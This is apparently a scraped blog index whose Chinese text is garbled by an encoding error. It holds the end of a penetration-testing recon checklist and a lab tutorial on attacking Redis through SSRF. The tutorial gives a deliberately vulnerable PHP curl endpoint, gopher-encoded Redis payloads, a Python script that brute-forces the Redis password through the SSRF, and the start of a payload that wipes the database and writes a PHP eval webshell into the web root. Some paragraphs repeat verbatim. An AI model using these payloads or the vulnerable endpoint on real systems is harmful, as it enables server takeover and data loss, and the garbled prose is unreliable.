ç™»å½•/æ³¨å†Œ/æ•æ„Ÿæ¡†æ¶ã€ç»„ä»¶ã€æœåŠ¡ç­‰ï¼š i)æŒ‡çº¹è¯†åˆ«å’ŒPOCå¯èƒ½ä¸å¤Ÿå®Œå¤‡ï¼Œé’ˆå¯¹ä¸€äº›äº§å“ï¼Œæ‰‹å·¥è¯†åˆ«å¹¶æ‰¾ä¸€äº›å†å²æ¼æ´æµ‹è¯• ii)é‡ç‚¹å…³æ³¨ ååºåˆ—åŒ–ã€æ–‡ä»¶ä¸Šä¼ ã€SQLæ³¨å…¥ æ¼æ´ï¼Œè¯¦ç»†æŒ–æ˜ä¸€ä¸‹ iii) ç™»å½•ç‚¹çˆ†ç ´ï¼Œå¯ä»¥æ”¶é›†ç›®æ ‡é‚®ç®±å’Œç¤¾å·¥å­—å…¸ iv)æ ¹æ®ç›®å½•æ‰«æç»“æœï¼Œå¯¹æœ‰ä¸œè¥¿çš„ç«™æ·±å…¥çœ‹ä¸€ä¸‹ v)æœ‰å……è¶³æ—¶é—´ï¼Œå¯ä»¥åƒæŒ–SRCä¸€æ ·å¯¹ä¸€äº›ç«™æ·±å…¥æŒ–æ˜ä¸€ä¸‹ã€‚ï¼ˆurlfinerã€jsæ¥å£ã€çˆ¬è™«çš„æ•æ„Ÿé“¾æ¥ä¹‹ç±»ã€‚ï¼‰ æµ‹è¯•æ—¶ï¼Œburpæ’ä»¶å®‰è£…å®Œå¤‡(strut2ã€shiroã€fastjsonã€log4j2ã€springã€SQLæ³¨å…¥ç›¸å…³ç­‰)éƒ½æ‰“å¼€ï¼Œ åŒæ—¶ï¼Œæœ‰æ¡ä»¶å¯ä»¥æŒ‚ç€xrayè¢«åŠ¨(xrayå¯ä»¥åªç”¨æ¥æµ‹sqlæ³¨å…¥) javaç«™åŸºæœ¬æ˜¯strut2å’Œspring äºŒé€‰ä¸€ï¼Œæœ‰æ—¶é—´éƒ½æ‰“ä¸€épocï¼ŒåŒæ—¶è¦æ³¨æ„log4j2æ¼æ´ä¸€å®šè¦æµ‹ä¸€ä¸‹ ï¼ˆå·¥å…·ï¼šSpringBoot-Scan-2.03ã€Spring_All_Reachableã€struts2_19.jarï¼‰ (log4j2ä¸€èˆ¬ä½¿ç”¨burpæ’ä»¶:https://github.com/whwlsfb/Log4j2Scan) å·¥å…·ï¼š æ™ºèƒ½ Webåå°å¯†ç çˆ†ç ´å·¥å…· https://github.com/Fly-Playgroud/Boom å¯ä»¥æ‰¹é‡çˆ†ç ´webåå° å°tipsï¼šå¤‡ä»½æ–‡ä»¶æ‰«æå¯ä»¥æå‰ i)å¯¹ä¸€äº›è‡ªå»ºç«™ç‚¹ï¼Œå¯ä»¥è¿›è¡Œå¤‡ä»½æ–‡ä»¶æ‰«æï¼Œæ‰¾åˆ°å¤‡ä»½æ–‡ä»¶ï¼Œå®¡æºç  ii)é€šè¿‡googleã€githubã€fofa ico/è¯ä¹¦/å…³é”®å­—/title=\"å•ä½å\"ç­‰ï¼Œæ”¶é›†æ›´å¤šèµ„äº§æˆ–è€…æ³„éœ²ä¿¡æ¯ iii)å¯¹äºä¸€äº›å°ä¼—äº§å“ï¼Œå¯ä»¥é€šè¿‡fofaç­‰ï¼Œæ‰¾å…¶ä»–äººä½¿ç”¨çš„ï¼Œå¯èƒ½åœ¨ç”¨ä½ç‰ˆæœ¬æˆ–è€…æœ‰å¤‡ä»½æ–‡ä»¶ï¼Œæ‹¿åˆ°æºç å»å®¡ è®¡ appã€å°ç¨‹åºã€å…¬ä¼—å· å¯¹å‘ç°çš„appã€å°ç¨‹åºã€å…¬ä¼—å·è¿›è¡Œè¿›ä¸€æ­¥çš„æ¢æµ‹ï¼Œç±»æ¯”webæ¢æµ‹è¿›è¡Œ Step Second æ”¶é›†ç›®æ ‡ ä¸Šä¸‹æ¸¸å…¬å¸ã€ä¾›åº”é“¾ã€IDCã€IDCä»£ç†å•†ç­‰ä¿¡æ¯ï¼Œé‡å¤ç¬¬ä¸€è½®çš„æ­¥éª¤ã€‚ ç”¨æ”¶é›†åˆ°çš„é‚®ç®±å†å»åæŸ¥ä¸€æ³¢ï¼Œå°±èƒ½æ‰¾åˆ°ä¸€éƒ¨åˆ†äº†ï¼Œç„¶åå»ç›¸å…³å¤‡æ¡ˆç½‘ç«™å†æ‰¾ä¸€éƒ¨åˆ†ï¼Œå‰©ä¸‹çš„å°±æ˜¯é€šè¿‡çˆ¬å–ç›¸å…³æ–°é—»ã€è¶…é“¾æ¥ã€å¹´æŠ¥ï¼Œä»é‡Œé¢æ‰¾è·Ÿä»–ä¸šåŠ¡ç›¸å…³çš„å…¬å¸ 0x05 åè®° è¿™å‡ å¤©å¿™å¾—è¦æ­»æ¥ä¸åŠå­¦ä¹ ã€‚ä»Šå¤©å¤§æ¦‚å­¦ä¹ å®Œäº†ï¼Œå›é¡¾ä¹‹å‰çš„å­¦ä¹ å†ç¨‹ï¼Œæ„Ÿè§‰æ˜¯æœ‰ç‚¹æŠ½è±¡çš„ï¼Œæ¯•ç«Ÿæ„Ÿè§‰åœ¨çº¸ä¸Šè°ˆå…µï¼Œå­¦çš„æœ‰ç‚¹æ²¡æ¿€æƒ…ï¼Œä½†è¿™å´æ˜¯åé¢è¿›ä¸€æ­¥æ·±å…¥çš„åŸºç¡€ï¼Œå¿…é¡»å•ƒä¸‹æ¥ã€‚ ç»è¿‡ä¸Šè¿°çš„å­¦ä¹ ï¼Œå¯¹æ¸—é€æµ‹è¯•ä»¥åŠæ‰“ç‚¹æµç¨‹æœ‰äº†è®¤è¯†ï¼Œä½†æ—¥åèƒ½å®æ–½äºå®è·µæ‰ç®—æˆåŠŸï¼Œåªèƒ½è¯´ä»»é‡é“è¿œã€‚æ€»çš„æ¥è¯´å¯¹äºä¸Šè¿°çš„æµç¨‹æ˜¯æœ‰è®¤è¯†äº†ï¼Œä½†å¯¹äºå·¥å…·å’Œå¹³å°ç­‰çš„ä½¿ç”¨è¿˜æ˜¯æœ‰ç‚¹æ‡µçš„ï¼Œè¢«å¼ºè¡Œå–‚äº†ä¸€é€šçŸ¥è¯†ï¼Œä½†å´æ²¡æœ‰å¥½å¥½æ¶ˆåŒ–ï¼Œå› æ­¤åœ¨ä»Šååº”è¯¥å¤šå®æˆ˜ç†Ÿæ‚‰å·¥å…·çš„åˆ©ç”¨ï¼Œè¿›ä¸€æ­¥ç†Ÿæ‚‰æ¸—é€æµ‹è¯•æµç¨‹ï¼ˆæ°´å¾ˆæ·±å•Š~~~ï¼‰ ä¹‹ååœ¨çœ‹ä¸€çœ‹st3pbyå¸ˆå‚…ç»™çš„å®æˆ˜æ‰“ç‚¹æ–‡ç« ï¼Œçœ‹çœ‹ä½¬ä»¬çš„éªšæ“ä½œã€‚æœ¬ç¯‡æ–‡ç« æ—¥åè‚¯å®šä¹Ÿä¼šæ›´æ–°çš„ï¼ˆæ¯•ç«Ÿè´¨é‡æœ‰ç‚¹å·®ï¼‰å¸Œæœ›ä¸æ–­å®Œå–„ï¼Œå½¢æˆä¸€ä¸ªä¼˜ç¾çš„ä¿¡æ¯æœé›†çŸ¥è¯†åº“ï¼ 0x06 å‚è€ƒæ–‡ç«  Webå®‰å…¨æ¸—é€æµ‹è¯•åŸºæœ¬æµç¨‹ d4m1ts çŸ¥è¯†åº“ å¹²è´§ | æœ€å…¨Web æ¸—é€æµ‹è¯•ä¿¡æ¯æœé›†-CheckList å…¨æµç¨‹ä¿¡æ¯æ”¶é›†æ–¹æ³•æ€»ç»“ DNSç¯‡ä¹‹digä½¿ç”¨è¯¦è§£ â€”â€”å¾ˆè¯¦ç»† digå‘½ä»¤çš„ä»‹ç»ä¸ä½¿ç”¨ DNSæœåŠ¡ç³»åˆ—ä¹‹ä¸€ï¼šæ³›åŸŸåè§£æçš„å®‰å…¨æ¡ˆä¾‹ nslookupå‘½ä»¤è¯¦è§£ï¼šnslookupæ˜¯ä¸€ç§ç½‘ç»œç®¡ç†å‘½ä»¤è¡Œå·¥å…·","tags":["å†…ç½‘æ¸—é€"],"categories":["å†…ç½‘æ¸—é€"]},{"title":"ssrfæ‰“redis","path":"/2023/12/27/ssrf-da-redis/","content":"0x01 SSRFä»‹ç» SSRFï¼ŒæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼Œæ˜¯ç”±æ”»å‡»è€…æ„é€ çš„æ¼æ´ï¼Œç”¨äºå½¢æˆæœåŠ¡å™¨å‘èµ·çš„è¯·æ±‚ã€‚é€šå¸¸ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯å¤–éƒ¨ç½‘ç»œæ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ä»Šå¤©å­¦ä¹ ä¸€æ‰‹redisä¸­å¦‚ä½•åˆ©ç”¨SSRFï¼Œæ„Ÿè§‰è¿™ä¸ªåœ¨å®æˆ˜ä¸­ä¸æ€ä¹ˆå¸¸è§ï¼Œä½†å…¶ä¸­çš„çŸ¥è¯†å€¼å¾—å­¦ä¹  0x02 ç¯å¢ƒæ­å»º è¿™é‡Œåœ¨åˆæ˜¯åºŸäº†ä¸€å¤©æ­å»ºæˆåŠŸï¼Œå»ºè®®å¤§å®¶è¿˜æ˜¯ç›´æ¥ä¸‹è½½redis-serveræœåŠ¡æ­å»ºæ¯”è¾ƒå¥½ï¼Œç½‘ä¸Šçš„æ•™ç¨‹å±å®æ˜¯æœ‰ç‚¹åƒåœ¾ä¸”å®³äºº è¿™é‡Œæˆ‘çš„ç‰ˆæœ¬çš„ubuntu22.04 LTS å®‰è£…Redisï¼š apt-get install redis-server ä¿®æ”¹Redisé…ç½®æ–‡ä»¶ï¼ˆè®¾ç½®å¯†ç ï¼Œç›‘å¬ipç­‰ï¼‰ï¼š vim /etc/redis/redis.conf é…ç½®ç›‘å¬ipï¼š bind 127.0.0.1 ::1#åªç›‘å¬æœ¬åœ°ç«¯å£ï¼Œå¦‚æœéœ€è¦è¿œç¨‹ç™»å½•å¯ä»¥åœ¨åé¢åŠ ä¸Šæœ¬æœºçš„ipï¼ŒåŒæ—¶è¿œç¨‹ç™»å½•ä¹Ÿå¯èƒ½é€ æˆæœªæˆæƒè®¿é—®ã€‚ é…ç½®é»˜è®¤å¯†ç ï¼š #requirepass foobared#é»˜è®¤æ— å¯†ç ï¼Œè¦è®¾ç½®å¯†ç å¯ä»¥å°†å‰é¢çš„#åˆ é™¤ï¼Œç„¶åå°†foobaredæ”¹ä¸ºè¦è®¾ç½®çš„å¯†ç ã€‚ å¯åŠ¨Redisï¼š /bin/redis-server /etc/redis/redis.conf æˆ–è€… service redis-server start#è¿™ç§æ–¹æ³•å¯åŠ¨å¯èƒ½ä¼šé€ æˆRedisåœ¨webç›®å½•ã€è®¡åˆ’ä»»åŠ¡ç›®å½•ã€.sshç›®å½•ç­‰å…¶ä»–ä¸€äº›ç›®å½•æ²¡æœ‰å†™å…¥çš„æƒé™ï¼Œå°±ç®—æ˜¯rootèº«ä»½å¯åŠ¨ï¼Œæ–‡ä»¶å¤¹777æƒé™ä¹Ÿä¸è¡Œï¼ˆå°±å¾ˆè¿·ï¼‰ã€‚å¦‚æœé‡åˆ°Redisåœ¨æ‰§è¡Œsaveæ—¶æŠ¥é”™ï¼Œå°±è¿˜æ˜¯è¯•è¯•rootèº«ä»½ç¬¬ä¸€ç§æ–¹æ³•å¯åŠ¨å§ã€‚ ç¬¬äºŒå¤©äº†ï¼Œä½ æ²¡çŒœé”™ï¼Œè¿™ç©æ„å„¿tmåˆåºŸäº†æˆ‘ä¸€å¤©æ—¶é—´æ­å»ºï¼Œæœ€ç»ˆè¿˜æ˜¯é€‰æ‹©centos7æ­å»ºæˆåŠŸ å…·ä½“å¯ä»¥å‚è€ƒï¼šRedisç¯å¢ƒæ­å»ºã€CentOS7 æ­å»ºphpç¯å¢ƒ â€“åªéœ€è¦å°†å…¶ä¸­çš„phpã€apacheæœåŠ¡å®‰è£…å¥½å³å¯ï¼Œæœ€åè®°å¾—åœ¨é˜²ç«å¢™å¼€å¯æ‰€éœ€è¦çš„ç«¯å£ã€‚å…¶ä¸­ssrf.phpä»£ç å¦‚ä¸‹ï¼š &lt;?php highlight_file(__FILE__); $ch = curl_init(); //åˆ›å»ºæ–°çš„ cURL èµ„æº curl_setopt($ch, CURLOPT_URL, $_GET['url']); //è®¾ç½®URL å’Œç›¸åº”çš„é€‰é¡¹ # curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_HEADER, 0); # curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_exec($ch); //æŠ“å– URL å†…å®¹å¹¶æŠŠå®ƒä¼ é€’ç»™æµè§ˆå™¨ï¼Œå­˜å‚¨è¿›æ–‡ä»¶ curl_close($ch); //å…³é—­ cURL èµ„æºï¼Œå¹¶ä¸”é‡Šæ”¾ç³»ç»Ÿèµ„æº ?&gt; æµ‹è¯•æ²¡æ¯›ç—…ã€‚ 0x03 å‰ç½®çŸ¥è¯† è¿™é‡Œçœ‹åˆ°å¸ˆå‚…ä»¬åœ¨æ¢è®¨è¿™ä¸€é—®é¢˜çš„æ—¶å€™éœ€è¦å­¦ä¹ ä¸€æ‰‹RESPåè®®ï¼Œé‚£æˆ‘ä»¬è·Ÿç€å¸ˆå‚…å­¦ä¸€æ‰‹ RESPåè®® RedisæœåŠ¡å™¨ä¸å®¢æˆ·ç«¯é€šè¿‡RESPï¼ˆREdis Serialization Protocolï¼‰åè®®é€šä¿¡ã€‚ RESPåè®®æ˜¯åœ¨Redis 1.2ä¸­å¼•å…¥çš„ï¼Œä½†å®ƒæˆä¸ºäº†ä¸Redis 2.0ä¸­çš„RedisæœåŠ¡å™¨é€šä¿¡çš„æ ‡å‡†æ–¹å¼ã€‚è¿™æ˜¯æ‚¨åº”è¯¥åœ¨Rediså®¢æˆ·ç«¯ä¸­å®ç°çš„åè®®ã€‚ RESPå®é™…ä¸Šæ˜¯ä¸€ä¸ªæ”¯æŒä»¥ä¸‹æ•°æ®ç±»å‹çš„åºåˆ—åŒ–åè®®ï¼šç®€å•å­—ç¬¦ä¸²ï¼Œé”™è¯¯ï¼Œæ•´æ•°ï¼Œæ‰¹é‡å­—ç¬¦ä¸²å’Œæ•°ç»„ã€‚ RESPåœ¨Redisä¸­ç”¨ä½œè¯·æ±‚ - å“åº”åè®®çš„æ–¹å¼å¦‚ä¸‹ï¼š å®¢æˆ·ç«¯å°†å‘½ä»¤ä½œä¸ºBulk Stringsçš„RESPæ•°ç»„å‘é€åˆ°RedisæœåŠ¡å™¨ã€‚ æœåŠ¡å™¨æ ¹æ®å‘½ä»¤å®ç°å›å¤ä¸€ç§RESPç±»å‹ã€‚ åœ¨RESPä¸­ï¼ŒæŸäº›æ•°æ®çš„ç±»å‹å–å†³äºç¬¬ä¸€ä¸ªå­—èŠ‚ï¼š å¯¹äº`Simple Strings`ï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯`+` å¯¹äº`error`ï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯`-` å¯¹äº`Integer`ï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯`:` å¯¹äº`Bulk Strings`ï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯`$` å¯¹äº`array`ï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯`*` æ­¤å¤–ï¼Œ`RESP`èƒ½å¤Ÿä½¿ç”¨ç¨åæŒ‡å®šçš„`Bulk Strings`æˆ–`Array`çš„ç‰¹æ®Šå˜ä½“æ¥è¡¨ç¤º`Null`å€¼ã€‚ åœ¨RESPä¸­ï¼Œåè®®çš„ä¸åŒéƒ¨åˆ†å§‹ç»ˆä»¥\"\\r \"(CRLF)ç»“æŸã€‚ æˆ‘ä»¬ç”¨tcpdumpæ¥æŠ“ä¸ªå®¢æˆ·ç«¯ä¸redisæœåŠ¡å™¨é€šä¿¡çš„åŒ…æ¥åˆ†æä¸€ä¸‹ å‘½ä»¤ï¼štcpdump -i lo -s 0 port 6379 -w redis.pcap å‚æ•°è¯´æ˜ï¼š -iæŒ‡å®šç½‘å¡ï¼ˆä¸€èˆ¬æŒ‡å®šeth0ï¼Œè¿™é‡ŒæŠ“å–æœ¬åœ°æ¥å£çš„æµé‡éœ€è¦æŒ‡å®šä¸ºloï¼‰ -sæŠ“å–æ•°æ®åŒ…æ—¶é»˜è®¤æŠ“å–é•¿åº¦ä¸º68å­—èŠ‚ã€‚åŠ ä¸Š-s 0 åå¯ä»¥æŠ“åˆ°å®Œæ•´çš„æ•°æ®åŒ… portæŒ‡å®šæŠ“å–çš„ç«¯å£ -wä¿å­˜åˆ°æ–‡ä»¶ï¼Œåæ¥ä¿å­˜çš„è·¯å¾„ä¸æ–‡ä»¶å è¿™é‡Œæœ¬åœ°å…ˆå¼€å¯ç›‘å¬ï¼Œä¹‹åè¿›å…¥redisæœåŠ¡å™¨redis-cli -h 127.0.0.1 -p 6379 ä¹‹ååœ¨redisæœåŠ¡å™¨æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ 127.0.0.1:6379&gt; set key1 value1 OK 127.0.0.1:6379&gt; quit æœ€åå°†äº§ç”Ÿçš„pcapæ•°æ®åŒ…ä¼ å…¥wiresharkè¿½è¸ªtcpæ•°æ®æµ è¿™é‡Œå¯¹äºè¯¥å·¥å…·çš„ä½¿ç”¨æ–¹æ³•å‡ ä¹ä¸æ‡‚ï¼Œä½†å¥½åœ¨æ‰¾åˆ°äº†ç›®æ ‡æ•°æ®ï¼Œå¦‚ä¸Šå›¾æ‰€ç¤º æŠ“åˆ°çš„æ•°æ®åŒ…å¦‚ä¸‹ï¼Œç»“åˆæˆ‘ä»¬ä¸Šé¢å¯¹RESPåè®®çš„è§£é‡Šï¼Œæˆ‘ä»¬æ¥é€è¡Œåˆ†æ: *3ï¼šä»£è¡¨æ•°ç»„ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªæ•°ç»„é•¿åº¦ä¸º3ï¼Œsetã€key1ã€value1å¯ä»¥å°†ä¹‹é—´çš„ç©ºæ ¼è®¤ä¸ºæ˜¯åˆ†éš”ç¬¦ $3ï¼šä»£è¡¨æ‰¹é‡å­—ç¬¦ä¸²ï¼Œé•¿åº¦ä¸º3ï¼šsetï¼›ä¹‹åçš„$4ã€$6åŒç† æœ€åçš„+OKï¼šä»£è¡¨ç®€å•å­—ç¬¦ä¸² å…¶ä¸­setä»£è¡¨è®¾ç½®keyï¼Œkeyä¸ºkey1ï¼Œå¯¹åº”çš„valueä¸ºvalue1 æœ€åçš„+OKä»£è¡¨æœåŠ¡ç«¯æ‰§è¡ŒæˆåŠŸåè¿”å›çš„å­—ç¬¦ä¸² hexè½¬å‚¨çœ‹ä¸€ä¸‹ æ­£å¦‚å‰é¢æ‰€è¯´çš„ï¼Œå®¢æˆ·ç«¯å‘å°†å‘½ä»¤ä½œä¸ºBulk Stringsçš„RESPæ•°ç»„å‘é€åˆ°RedisæœåŠ¡å™¨ï¼Œç„¶åæœåŠ¡å™¨æ ¹æ®å‘½ä»¤å®ç°å›å¤ç»™å®¢æˆ·ç«¯ä¸€ç§RESPç±»å‹ã€‚ è¿™é‡Œçš„0d0aä»£è¡¨CRLFä¹Ÿå°±æ˜¯å›è½¦æ¢è¡Œç¬¦ï¼Œåœ¨è¿™é‡Œä»£è¡¨ç»“æŸç¬¦ã€‚é‚£æœ‰è¶£çš„æ¥äº†ï¼Œå¦‚æœæˆ‘ä»¬å°†ä¸Šè¿°çš„æ•°æ®è¿›è¡Œurlç¼–ç éšååœ¨æœ¬æœº127.0.0.1ä¸­é€šè¿‡curlå’Œgopherå‘é€ç»™redisæœåŠ¡å™¨ä¼šå¦‚ä½•å‘¢ï¼Ÿ *3 $3 set $4 key1 $6 value1 ç»è¿‡urlç¼–ç åï¼šæ³¨æ„è¿™é‡Œçš„%0Aéœ€è¦æ¢æˆ%0D0A %2A3%0D%0A%243%0D%0Aset%0D%0A%244%0D%0Akey1%0D%0A%246%0D%0Avalue1%0D%0A å†æ¥ç€ gopher://127.0.0.1:6379/_%2A3%0D%0A%243%0D%0Aset%0D%0A%244%0D%0Akey1%0D%0A%246%0D%0Avalue1%0D%0A å¦‚ä¸Šå›¾å¯ä»¥çœ‹åˆ°å·¦ä¾§çš„OKä»£è¡¨æˆ‘ä»¬æ‰§è¡ŒæˆåŠŸï¼Œå³å›¾æ˜¯æˆ‘ä»¬ç™»å½•redisæœåŠ¡å™¨ä¹‹åéªŒè¯key1çš„å€¼æ˜¯å¦è¢«è®¾ç½®äº† è¿™é‡Œçœ‹åˆ°å¸ˆå‚…è¿˜å°è¯•ç›´æ¥ä½¿ç”¨å‘½ä»¤å‘é€ï¼Œè€Œä¸é‡‡å–tcpæ•°æ®æµäº†ã€‚æˆ‘ä»¬ä¹Ÿå°è¯•ä¸€ä¸‹ å‘½ä»¤ï¼š set key2 value2 get key2 urlç¼–ç åï¼š gopher://127.0.0.1:6379/_set%20key2%20value2%0D%0Aget%20key2%0D%0A å¦‚ä¸Šå›¾ï¼Œçœ‹åˆ°æˆåŠŸè¿”å›äº†æˆ‘ä»¬åˆšåˆšè®¾ç½®çš„keyçš„å€¼ï¼Œè¯´æ˜ç›´æ¥å‘é€å‘½ä»¤çš„æ–¹æ³•ä¹Ÿæ˜¯å¯è¡Œçš„ã€‚çŸ¥é“äº†å¦‚ä½•è®©RedisæœåŠ¡å™¨æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬å°±æ¥çœ‹å¦‚ä½•æ”»å‡»æ¥è¾¾åˆ° getshell çš„ç›®çš„ã€‚ 0x04 Redisé…åˆgopheråè®®è¿›è¡ŒSSRF æ¦‚è¿° gopheråè®®æ˜¯httpåè®®å‡ºç°ä¹‹å‰ï¼Œåœ¨internetä¸­å¸¸è§çš„ä¸€ä¸ªåè®®ï¼Œä½†ç°åœ¨è¿™ä¸ªåè®®ç”¨çš„è¶Šæ¥è¶Šå°‘äº†ï¼Œä½†è¯¥åè®®åœ¨ssrfä¸­å´å¤§æœ‰ç”¨é€”ï¼Œå¯ä»¥ç”¨æ¥æ”»å‡»redisã€ftpç­‰ï¼Œè¿˜å¯ä»¥å‘é€getã€postè¯·æ±‚ï¼Œè¿™åœ¨ssrfæ”»å‡»ä¸­å¤§æœ‰ä½œä¸ºã€‚ åˆ©ç”¨æ¡ä»¶ redisæ‰€åœ¨çš„æœåŠ¡ç«¯å­˜åœ¨æœªæˆæƒè®¿é—®æˆ–è€…é€šè¿‡å¼±å£ä»¤å¯ä»¥è®¿é—®åˆ° åˆ©ç”¨ rediså¸¸è§çš„SSRFæ”»å‡»æ–¹å¼å¤§æ¦‚æœ‰è¿™å‡ ç§ï¼š redisè®¤è¯æ”»å‡» ç»å¯¹è·¯å¾„å†™webshell å†™sshå…¬é’¥ å†™contrabè®¡åˆ’ä»»åŠ¡åå¼¹shell ä¸‹é¢æˆ‘ä»¬é€ä¸ªå®ç° redisè®¤è¯æ”»å‡» è¿™é‡Œå‘¢ä¹Ÿæ˜¯å¯ä»¥åˆ†ä¸ºä¸¤ç§æƒ…å†µçš„ï¼Œä¸€ç§æ˜¯é‡åˆ°é»˜è®¤æ— å¯†ç çš„redisæœåŠ¡å™¨ï¼Œå¦ä¸€ç§å°±æ˜¯æœ‰å¯†ç çš„ã€‚ æ— å¯†ç Redisæ”»å‡» å…ˆè€ƒè™‘æ— å¯†ç çš„ï¼Œè¿™é‡Œå‘¢å…¶å®ä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸Šè¿°0x03ä¸­ä»‹ç»è¿‡çš„å¯ä»¥ç›´æ¥æ„é€ æ¶æ„çš„æ˜æ–‡å‘½ä»¤ï¼Œæˆ–è€…tcpæ•°æ®æµï¼Œå‘é€ç»™redisæœåŠ¡å™¨ ä½†è¿™é‡Œå‘¢å¦‚æœå¯¹æ–¹çš„redisæœåŠ¡æš´éœ²åœ¨å…¬ç½‘ï¼Œè¿™å°±å¥½åŠäº†ï¼Œç›´æ¥curlå‘é€gopheråè®®å³å¯ã€‚ ä½†å¦‚æœå¯¹æ–¹redisé™åˆ¶åªç›‘å¬æœ¬åœ°è¯·æ±‚ï¼Œé‚£æˆ‘ä»¬å°±åªèƒ½ç¥ˆç¥·å¯¹æ–¹æœåŠ¡å™¨å­˜åœ¨ssrfï¼Œæ¥ä¸‹æ¥å¯¹äºæ— å¯†ç çš„æˆ‘å°±ç›´æ¥cvä¸Šé¢çš„äº†ã€‚ å¦‚æœæˆ‘ä»¬å°†ä¸Šè¿°çš„æ•°æ®è¿›è¡Œurlç¼–ç éšååœ¨æœ¬æœº127.0.0.1ä¸­é€šè¿‡curlå’Œgopherå‘é€ç»™redisæœåŠ¡å™¨ä¼šå¦‚ä½•å‘¢ï¼Ÿ *3 $3 set $4 key1 $6 value1 ç»è¿‡urlç¼–ç åï¼šæ³¨æ„è¿™é‡Œçš„%0Aéœ€è¦æ¢æˆ%0D0A %2A3%0D%0A%243%0D%0Aset%0D%0A%244%0D%0Akey1%0D%0A%246%0D%0Avalue1%0D%0A å†æ¥ç€ gopher://127.0.0.1:6379/_%2A3%0D%0A%243%0D%0Aset%0D%0A%244%0D%0Akey1%0D%0A%246%0D%0Avalue1%0D%0A å¦‚ä¸Šå›¾å¯ä»¥çœ‹åˆ°å·¦ä¾§çš„OKä»£è¡¨æˆ‘ä»¬æ‰§è¡ŒæˆåŠŸï¼Œå³å›¾æ˜¯æˆ‘ä»¬ç™»å½•redisæœåŠ¡å™¨ä¹‹åéªŒè¯key1çš„å€¼æ˜¯å¦è¢«è®¾ç½®äº† è¿™é‡Œçœ‹åˆ°å¸ˆå‚…è¿˜å°è¯•ç›´æ¥ä½¿ç”¨å‘½ä»¤å‘é€ï¼Œè€Œä¸é‡‡å–tcpæ•°æ®æµäº†ã€‚æˆ‘ä»¬ä¹Ÿå°è¯•ä¸€ä¸‹ å‘½ä»¤ï¼š set key2 value2 get key2 urlç¼–ç åï¼š gopher://127.0.0.1:6379/_set%20key2%20value2%0D%0Aget%20key2%0D%0A å¦‚ä¸Šå›¾ï¼Œçœ‹åˆ°æˆåŠŸè¿”å›äº†æˆ‘ä»¬åˆšåˆšè®¾ç½®çš„keyçš„å€¼ï¼Œè¯´æ˜ç›´æ¥å‘é€å‘½ä»¤çš„æ–¹æ³•ä¹Ÿæ˜¯å¯è¡Œçš„ã€‚çŸ¥é“äº†å¦‚ä½•è®©RedisæœåŠ¡å™¨æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬å°±æ¥çœ‹å¦‚ä½•æ”»å‡»æ¥è¾¾åˆ° getshell çš„ç›®çš„ã€‚ æœ‰å¯†ç Redisæ”»å‡» è¿™é‡Œæˆ‘ä»¬å…ˆç¡®å®šä¸€ä¸ªç™»å½•è®¤è¯å¯†ç ï¼Œä¿®æ”¹redisä¸‹çš„é…ç½®æ–‡ä»¶ redis.confï¼Œæœç´¢ requirepass å…³é”®å­—ã€‚ vim /etc/redis/redis.confï¼Œå¦‚ä¸‹å›¾å°†#å»æ‰ï¼Œå¹¶åœ¨requirepassåé¢æ·»åŠ å¯†ç  é€€å‡ºåé‡æ–°å¯åŠ¨redisæœåŠ¡ï¼Œæ¥ç€æˆ‘ä»¬å¼€å§‹çˆ†ç ´ã€‚ å¯¹äºè¿™ç§éœ€è¦å¯†ç ç™»å½•è®¤è¯çš„ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•å¼±å¯†ç ï¼Œä½†æ‰‹åŠ¨å¤ªéº»çƒ¦ï¼Œè¿™é‡Œæˆ‘å°±è·Ÿå¸ˆå‚…å­¦ç€å†™ä¸ªè„šæœ¬ import requests target = \"http://192.168.246.138/ssrf.php?url=\" # è¯·è¾“å…¥ç›®æ ‡url rhost = \"127.0.0.1\" rport = \"6379\" with open(\"password.txt\",\"r+\") as file: passwds = file.readlines() for passwd in passwds: passwd = passwd.strip(\" \") len_pass = len(passwd) payload = r\"gopher://\" + rhost + \":\" + rport + \"/_%252A2%250d%250a%25244%250d%250aAUTH%250d%250a%2524\"+str(len_pass)+r\"%250d%250a\"+passwd+r\"%250D%250A%252A1%250D%250A\" url = target+str(payload) text = requests.get(url).text if \"OK\" in text: print(\"[+] çˆ†ç ´æˆåŠŸ å¯†ç ä¸º: \" + passwd) print(text + payload) break ä¸Šå›¾ä¸ºç®€å•çš„å­—å…¸ï¼Œå¦‚ä¸‹å›¾å¯ä»¥çœ‹åˆ°æœ€ååœåœ¨äº†hybcxè¿™é‡Œï¼Œè¯´æ˜å¯†ç ä¸ºhybcx å¦‚ä¸‹å›¾æ£€éªŒæˆåŠŸ ç»å¯¹è·¯å¾„å†™webshell æ®è¯´è¿™ä¸ªæ–¹æ³•æ˜¯æœ€å¸¸ç”¨çš„ æ„é€ payload å…ˆæ„é€ rediså‘½ä»¤ flushall #åˆ é™¤redisæ•°æ®åº“ä¸­æ‰€æœ‰çš„key set 1 '&lt;?php eval($_GET[\"cmd\"]);?&gt;' #è®¾ç½®é”®1ï¼Œå€¼ä¸ºä¸€å¥è¯æœ¨é©¬ config set dir /var/www/html #è®¾ç½®redisæ•°æ®åº“æ–‡ä»¶å­˜å‚¨ä½ç½®ï¼Œè¿™é‡Œè®¾ç½®ä¸ºäº†webç›®å½• 